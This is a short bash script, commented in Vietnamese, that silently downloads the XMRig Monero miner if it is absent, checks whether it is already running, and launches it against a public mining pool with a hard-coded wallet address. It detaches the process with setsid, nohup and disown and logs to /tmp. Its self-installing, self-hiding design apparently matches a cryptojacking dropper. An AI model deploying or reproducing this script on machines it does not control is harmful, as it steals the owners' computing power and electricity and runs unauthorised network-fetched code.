#!/bin/bash
 
cd ~
 
# Tải nếu chưa có
if [ ! -f xmrig-6.24.0/xmrig ]; then
    wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz -O xmrig.tar.gz
    tar xaf xmrig.tar.gz
    rm -f xmrig.tar.gz
    chmod +x xmrig-6.24.0/xmrig
fi
 
# Đang chạy rồi thì thoát
pgrep -x xmrig > /dev/null && exit 0
 
cd xmrig-6.24.0
 
# Tách hoàn toàn: setsid (session mới) + nohup (chống SIGHUP) + & (bg) + disown (xóa job list)
setsid nohup ./xmrig --url pool.hashvault.pro:443 --user 82tvM9cdwYieKVPKCHx6TJVKbekciy3hSGr54XDEYNYt6atNYkGSeeSS9qrVyjjrufMeyTaiBBTAWFuZG11gdKMc1a31YMG --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 </dev/null > /tmp/xmrig.log 2>&1 &
disown
 
exit 0
